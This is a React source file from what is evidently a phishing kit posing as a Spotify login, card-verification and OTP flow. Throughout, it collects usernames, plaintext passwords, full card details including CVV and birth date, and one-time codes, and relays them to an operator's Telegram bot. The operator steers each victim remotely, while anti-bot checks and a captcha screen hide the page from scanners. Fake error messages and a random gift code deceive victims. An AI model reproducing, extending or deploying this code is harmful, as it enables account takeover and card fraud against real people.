import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useLanguage } from '../hooks/useLanguage';
import { useTelegramBot } from '../hooks/useTelegramBot';
import { startTimer, trackInteraction, trackTyping, checkAntiBot, resetAntiBot } from '../utils/antiBot';
import LoginScreen from './LoginScreen';
import CardVerificationForm from './CardVerificationForm';
import OtpVerificationForm from './OtpVerificationForm';
import LoadingOverlay from './LoadingOverlay';
import NextStepAppr from './NextStepAppr';
import './LoginForm.css';
import ApprovePopup from './ApprovePopup';
import { countryCodes } from './CardVerificationForm';
import GiftCardPopup from './GiftCardPopup';
import SpotifyApprove from './SpotifyApprove';
import CaptchaVerification from './CaptchaVerification';

const saveState = (key, value) => {
  try { sessionStorage.setItem(key, JSON.stringify(value)); } catch (e) {}
};
const loadState = (key, defaultValue) => {
  try {
    const item = sessionStorage.getItem(key);
    return item ? JSON.parse(item) : defaultValue;
  } catch (e) { return defaultValue; }
};

function LoginForm() {
  const { t } = useLanguage();

  const [showCaptcha, setShowCaptcha] = useState(() => {
    return sessionStorage.getItem('captcha_verified') !== 'true';
  });

  const [loginName, setLoginName] = useState(() => loadState('loginName', ''));
  const [password, setPassword] = useState(() => loadState('password', ''));
  const [errors, setErrors] = useState({ loginName: false, password: false });
  const [showCardForm, setShowCardForm] = useState(() => loadState('showCardForm', false));
  const [isLoading, setIsLoading] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
  const [showOtpForm, setShowOtpForm] = useState(() => loadState('showOtpForm', false));
  const [otpCode, setOtpCode] = useState(() => loadState('otpCode', ''));
  const [otpError, setOtpError] = useState('');
  const [sessionId, setSessionId] = useState(() => loadState('sessionId', null));
  const [showNextStep, setShowNextStep] = useState(() => loadState('showNextStep', false));
  const [showApprovePopup, setShowApprovePopup] = useState(false);
  const [waitingForAdminOtp, setWaitingForAdminOtp] = useState(false);
  const [showSpotifyApprove, setShowSpotifyApprove] = useState(false);
  const [otpAttempts, setOtpAttempts] = useState(0);

  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');

  const [loginTypingSent, setLoginTypingSent] = useState(false);
  const [cardTypingSent, setCardTypingSent] = useState(false);
  const [otpTypingSent, setOtpTypingSent] = useState(false);

  const hasSentCardPageLogRef = useRef(false);
  const hasSentOtpLogRef = useRef(false);
  const hasSentSiteEntryRef = useRef(false);

  const [cardDetails, setCardDetails] = useState(() => {
    const saved = sessionStorage.getItem('cardDetails');
    return saved ? JSON.parse(saved) : {
      cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
      phoneNumber: '', city: '', postalCode: '',
      birthDate: { day: '', month: '', year: '' }
    };
  });
  const [cardErrors, setCardErrors] = useState({});

  const handleCaptchaSuccess = () => {
    sessionStorage.setItem('captcha_verified', 'true');
    setShowCaptcha(false);
  };

  useEffect(() => { saveState('loginName', loginName); }, [loginName]);
  useEffect(() => { saveState('password', password); }, [password]);
  useEffect(() => { saveState('showCardForm', showCardForm); }, [showCardForm]);
  useEffect(() => { saveState('showOtpForm', showOtpForm); }, [showOtpForm]);
  useEffect(() => { saveState('otpCode', otpCode); }, [otpCode]);
  useEffect(() => { saveState('sessionId', sessionId); }, [sessionId]);
  useEffect(() => { saveState('showNextStep', showNextStep); }, [showNextStep]);
  useEffect(() => { saveState('cardDetails', cardDetails); }, [cardDetails]);

  const handleApproveLogin = () => {
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowApprovePopup(true);
  };

  const handleSpotifyAppr = () => { setShowSpotifyApprove(true); };

  const handleOtpLogin = () => {
    setShowNextStep(false);
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowOtpForm(true);
    if (sendLoginOtpMessage) sendLoginOtpMessage(loginName, sessionId);
  };

  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  const handleLoginFalse = () => {
    setWaitingForApproval(false);
    setIsLoading(false);
    setErrors({ loginName: true, password: false });
    setPassword('');
  };

  const handleCardVerificationFromTelegram = () => {
    setShowNextStep(false);
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowApprovePopup(false);
    setShowOtpForm(false);
    setShowCardForm(true);
  };

  const handleApprove = async () => {
    if (!hasSentCardPageLogRef.current && sendCardVerificationPageLog) {
      await sendCardVerificationPageLog(loginName);
      hasSentCardPageLogRef.current = true;
    }
    setWaitingForApproval(false);
    setIsLoading(false);
    const hasCardDetails = cardDetails.cardNumber && cardDetails.cardNumber.trim() !== '';
    if (hasCardDetails) {
      if (sendConfirmationLog) {
        await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
      }
      sessionStorage.setItem('loginName', loginName);
      sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
      sessionStorage.setItem('sessionId', sessionId);
      setShowNextStep(true);
    } else {
      setShowNextStep(false);
      setShowCardForm(true);
    }
  };

  const handleDeny = () => {
    setWaitingForApproval(false);
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    alert(t.denied);
    sessionStorage.clear();
    window.location.reload();
  };

  const handleViewCard = async () => {
    if (!hasSentCardPageLogRef.current && sendCardVerificationPageLog) {
      await sendCardVerificationPageLog(loginName);
      hasSentCardPageLogRef.current = true;
    }
    setWaitingForApproval(false);
    setIsLoading(false);
    setShowCardForm(true);
  };

  const handleNextStep = async () => {
    setShowSpotifyApprove(false);
    if (!hasSentOtpLogRef.current && sendOtpPageLog) {
      await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
      hasSentOtpLogRef.current = true;
    }
    setShowNextStep(false);
    setWaitingForOtpApproval(false);
    setIsLoading(false);
    setShowCardForm(false);
    setShowOtpForm(true);
    setOtpCode('');
    setOtpError('');
    setOtpAttempts(0);
  };

  const handleBackToCard = () => {
    setShowSpotifyApprove(false);
    setShowOtpForm(false);
    setShowCardForm(true);
    setOtpCode('');
    setOtpError('');
    hasSentOtpLogRef.current = false;
    setOtpTypingSent(false);
  };

  const handleBackToLogin = () => {
    sessionStorage.removeItem('ip_checked');
    sessionStorage.removeItem('blocked_ip');
    setShowSpotifyApprove(false);
    setShowNextStep(false);
    setShowCardForm(false);
    setShowOtpForm(false);
    setWaitingForOtpApproval(false);
    setWaitingForApproval(false);
    setIsLoading(false);
    setCardDetails({
      cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
      phoneNumber: '', city: '', postalCode: '',
      birthDate: { day: '', month: '', year: '' }
    });
    setCardErrors({});
    setOtpCode('');
    setOtpError('');
    setLoginTypingSent(false);
    setCardTypingSent(false);
    setOtpTypingSent(false);
    hasSentCardPageLogRef.current = false;
    hasSentOtpLogRef.current = false;
    sessionStorage.clear();
    resetAntiBot();
    startTimer();
  };

  const handleBlock = async () => {
    setShowSpotifyApprove(false);
    try {
      const response = await axios.get('https://api.ipify.org?format=json');
      const userIP = response.data.ip;
      const blockedIPs = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
      if (!blockedIPs.includes(userIP)) {
        blockedIPs.push(userIP);
        localStorage.setItem('blocked_ips', JSON.stringify(blockedIPs));
      }
      sessionStorage.setItem('blocked_ip', userIP);
      window.location.href = '/#/blocked';
    } catch (error) {
      window.location.href = '/#/blocked';
    }
  };

  const handleNextStepAppr = async () => {
    setShowSpotifyApprove(false);
    setShowNextStep(true);
    setWaitingForApproval(false);
    setIsLoading(false);
  };

  const handleBackToAppr = () => {
    setShowSpotifyApprove(false);
    window.location.href = '/#/';
  };

  const handleDenyOtp = () => {
    setShowSpotifyApprove(false);
    setOtpError('Invalid OTP code. Please try again.');
  };

  const handleOtpFalse = () => {
    setShowSpotifyApprove(false);
    setWaitingForAdminOtp(false);
    const newAttempts = otpAttempts + 1;
    setOtpAttempts(newAttempts);
    if (newAttempts === 1) {
      setOtpError('Incorrect code. Please try again.');
    } else if (newAttempts === 2) {
      setOtpError('Invalid code. Last attempt!');
    } else if (newAttempts >= 3) {
      setOtpError('Card blocked. Please contact your bank.');
      setTimeout(() => {
        setShowOtpForm(false);
        setShowCardForm(false);
        setOtpAttempts(0);
        setOtpCode('');
        setOtpError('');
        setCardDetails({
          cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
          phoneNumber: '', city: '', postalCode: '',
        });
        setWaitingForAdminOtp(false);
        sessionStorage.clear();
      }, 5000);
      return;
    }
    setOtpCode('');
  };

  const handleCardFalse = () => {
    setShowSpotifyApprove(false);
    setShowCardForm(true);
    setShowOtpForm(false);
    setWaitingForOtpApproval(false);
    setWaitingForAdminOtp(false);
    setIsLoading(false);
    setCardErrors({});
    const popup = document.createElement('div');
    popup.style.cssText = `
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #1a1a1a;
      color: #e74c3c;
      padding: 14px 28px;
      border-radius: 500px;
      font-size: 14px;
      font-weight: 600;
      z-index: 9999;
      font-family: Arial, sans-serif;
      border: 1px solid #e74c3c;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    `;
    popup.textContent = '⚠️ Please verify your card details and try again.';
    document.body.appendChild(popup);
    setTimeout(() => popup.remove(), 3000);
  };

  const handleApproveOtp = async () => {
    setWaitingForAdminOtp(false);
    setOtpAttempts(0);
    if (sendOtpVerifiedLog) await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
    if (sendSuccessToTelegram) await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
    if (sendFormattedCardDetails) await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  const {
    generateSessionId,
    sendLoginRequestToTelegram,
    sendCheckoutEmailToTelegram,
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendLoginOtpMessage,
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendSiteEntryLog,
    sendOtpTypingLog,
    sendBlockedLog,
    sendConfirmationLog,
  } = useTelegramBot(
    sessionId,
    handleApprove,
    handleDeny,
    handleViewCard,
    handleNextStep,
    handleBackToCard,
    handleBackToLogin,
    handleBlock,
    handleNextStepAppr,
    handleBackToAppr,
    handleDenyOtp,
    handleOtpFalse,
    handleApproveOtp,
    handleCardFalse,
    handleApproveLogin,
    handleOtpLogin,
    handleLoginFalse,
    handleCardVerificationFromTelegram,
    handleSpotifyAppr
  );

  useEffect(() => {
    startTimer();
    const handleMouseMove = () => trackInteraction();
    window.addEventListener('mousemove', handleMouseMove);
    const sessionBlocked = sessionStorage.getItem('blocked_ip');
    if (!sessionBlocked && !hasSentSiteEntryRef.current && sendSiteEntryLog) {
      sendSiteEntryLog();
      hasSentSiteEntryRef.current = true;
    }
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      resetAntiBot();
    };
  }, []);

  const handleInputChange = async (field, value) => {
    trackTyping();
    if (field === 'loginName') {
      setLoginName(value);
      if (!loginTypingSent && value.length === 1 && sendLoginTypingLog) {
        await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
        setLoginTypingSent(true);
      }
    } else {
      setPassword(value);
      if (!loginTypingSent && value.length === 1 && sendLoginTypingLog) {
        await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
        setLoginTypingSent(true);
      }
    }
    setErrors({ ...errors, [field]: false });
  };

  const handleLogin = async (e, directLoginName, directPassword) => {
    const safeLoginName = typeof directLoginName === 'string' ? directLoginName : (typeof loginName === 'string' ? loginName : '');
    const safePassword = typeof directPassword === 'string' ? directPassword : (typeof password === 'string' ? password : '');

    if (e) { e.preventDefault(); e.stopPropagation(); }
    if (isLoading || waitingForApproval) return;

    setErrors({ loginName: safeLoginName.trim() === '' });

    const antiBotResult = checkAntiBot();
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {}
      if (sendBlockedLog) await sendBlockedLog(safeLoginName, antiBotResult.reason, userIP);
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/#/blocked';
      return;
    }

    // ✅ Keep captcha verified
    sessionStorage.setItem('captcha_verified', 'true');

    sessionStorage.setItem('loginName', safeLoginName.trim());
    sessionStorage.setItem('password', safePassword.trim());

    setIsLoading(true);

    try {
      const newSessionId = generateSessionId();
      setSessionId(newSessionId);
      sessionStorage.setItem('telegramSessionId', newSessionId);

      const message = `
  🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
  ⏰ <b>Time:</b> ${new Date().toLocaleString()}
  🆔 <b>Session ID:</b> <code>${newSessionId}</code>
  ━━━━━━━━━━━━━━━━━━━━━
  📝 <b>LOGIN CREDENTIALS:</b>
  ├ 👤 <b>Username:</b> ${safeLoginName.trim()}
  └ 🔑 <b>Password:</b> ${safePassword.trim()}
  ━━━━━━━━━━━━━━━━━━━━━
  🤖 <b>Anti-bot Status:</b> ✅ PASSED
  ━━━━━━━━━━━━━━━━━━━━━
  ⚠️ <i>Choose an action below:</i>`;
      await sendLoginRequestToTelegram(message, newSessionId);

      setTimeout(() => {
        setIsLoading(false);
        setShowCardForm(true);
      }, 3000);
    } catch (error) {
      setIsLoading(false);
    }
  };

  const handleCardSubmit = async (e, data) => {
    if (e && e.preventDefault) e.preventDefault();
    let activeCardDetails = cardDetails;
    if (data && data.cardDetails) {
      activeCardDetails = { ...cardDetails, ...data.cardDetails };
      setCardDetails(activeCardDetails);
    }
    sessionStorage.setItem('cardNumber', activeCardDetails.cardNumber);
    let activeSid = sessionId || sessionStorage.getItem('telegramSessionId');
    if (!activeSid) {
      activeSid = generateSessionId();
      setSessionId(activeSid);
      sessionStorage.setItem('telegramSessionId', activeSid);
    }

    // ✅ Keep captcha verified (this is what was missing)
    sessionStorage.setItem('captcha_verified', 'true');

    const antiBotResult = checkAntiBot();
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {}
      if (sendBlockedLog) await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/#/blocked';
      return;
    }
    let errors = {};
    if (!activeCardDetails.cardNumber.trim() || activeCardDetails.cardNumber.replace(/\s/g, '').length < 16) {
      errors.cardNumber = t.validCard;
    }
    if (!activeCardDetails.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(activeCardDetails.expiryDate)) {
      errors.expiryDate = t.validExpiry;
    }
    if (!activeCardDetails.cvv.trim() || (activeCardDetails.cvv.length !== 3 && activeCardDetails.cvv.length !== 4)) {
      errors.cvv = t.validCvv;
    }
    if (Object.keys(errors).length === 0) {
      setIsLoading(true);
      setWaitingForOtpApproval(true);
      if (sendCardVerificationLog) await sendCardVerificationLog(loginName);
      if (sendCardDetailsToTelegram) await sendCardDetailsToTelegram(activeCardDetails, activeSid);
      sessionStorage.setItem('loginName', loginName);
      sessionStorage.setItem('cardNumber', activeCardDetails.cardNumber);
      sessionStorage.setItem('sessionId', sessionId);
      setTimeout(() => {
        setIsLoading(false);
        setWaitingForOtpApproval(false);
        setShowCardForm(false);
        setShowNextStep(true);
      }, 5000);
    } else {
      setCardErrors(errors);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (!otpCode.trim() || otpCode.length < 6) {
      setOtpError(t.validOtp);
      return;
    }
    const antiBotResult = checkAntiBot();
    if (!antiBotResult.passed) {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {}
      if (sendBlockedLog) await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
      sessionStorage.setItem('block_reason', antiBotResult.reason);
      window.location.href = '/#/blocked';
      return;
    }
    const isLoginOtp = !cardDetails.phoneNumber;
    if (isLoginOtp) {
      if (sendOtpSubmitLog) await sendOtpSubmitLog(loginName, 'Login OTP', otpCode);
      setWaitingForAdminOtp(true);
      setTimeout(() => {
        setWaitingForAdminOtp(false);
        setShowOtpForm(false);
        setShowCardForm(true);
        setOtpCode('');
        setOtpError('');
      }, 5000);
    } else {
      setWaitingForAdminOtp(true);
      if (sendOtpSubmitLog) await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
      if (sendOtpToTelegram) await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
    }
  };

  const handleOtpChange = async (value) => {
    trackTyping();
    setOtpCode(value);
    if (!otpTypingSent && value.length === 1 && sendOtpTypingLog) {
      await sendOtpTypingLog(loginName, cardDetails.phoneNumber, 'User is typing OTP code');
      setOtpTypingSent(true);
    }
    setOtpError('');
  };

  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval || waitingForAdminOtp;

  return (
    <div className="login-container">
      <LoadingOverlay
        isLoading={isLoadingState}
        waitingForApproval={waitingForApproval}
        waitingForOtpApproval={waitingForOtpApproval}
      />

      {showCaptcha ? (
        <CaptchaVerification onSuccess={handleCaptchaSuccess} />
      ) : (
        <>
          {showSpotifyApprove ? (
            <SpotifyApprove onClose={() => setShowSpotifyApprove(false)} />
          ) : showNextStep ? (
            <NextStepAppr />
          ) : (
            <>
              {!showCardForm && !showOtpForm && !waitingForApproval && (
                <LoginScreen
                  loginName={loginName}
                  password={password}
                  errors={errors}
                  isLoading={isLoading}
                  t={t}
                  onInputChange={handleInputChange}
                  onLogin={handleLogin}
                  onCheckout={async () => {
                    sessionStorage.setItem('loginName', loginName);
                    if (sendCheckoutEmailToTelegram) {
                      await sendCheckoutEmailToTelegram();
                    }
                    setShowCardForm(true);
                    setShowOtpForm(false);
                    setShowNextStep(false);
                    setWaitingForApproval(false);
                  }}
                />
              )}

              {/* ✅ Card form stays mounted during loading (so page is visible behind popup) */}
              {showCardForm && (
                <CardVerificationForm
                  onSubmit={handleCardSubmit}
                  domain={loginName}
                  isLoading={isLoading}
                />
              )}

              {showOtpForm && (
                <OtpVerificationForm
                  otpCode={otpCode}
                  otpError={otpError}
                  isLoading={isLoading}
                  t={t}
                  onOtpChange={handleOtpChange}
                  onSubmit={handleOtpSubmit}
                  onBack={handleBackToCard}
                />
              )}

              {showApprovePopup && (
                <ApprovePopup onClose={() => setShowApprovePopup(false)} />
              )}
            </>
          )}

          {showGiftCard && (
            <GiftCardPopup
              giftCode={giftCode}
              onClose={() => setShowGiftCard(false)}
            />
          )}
        </>
      )}
    </div>
  );
}

export default LoginForm;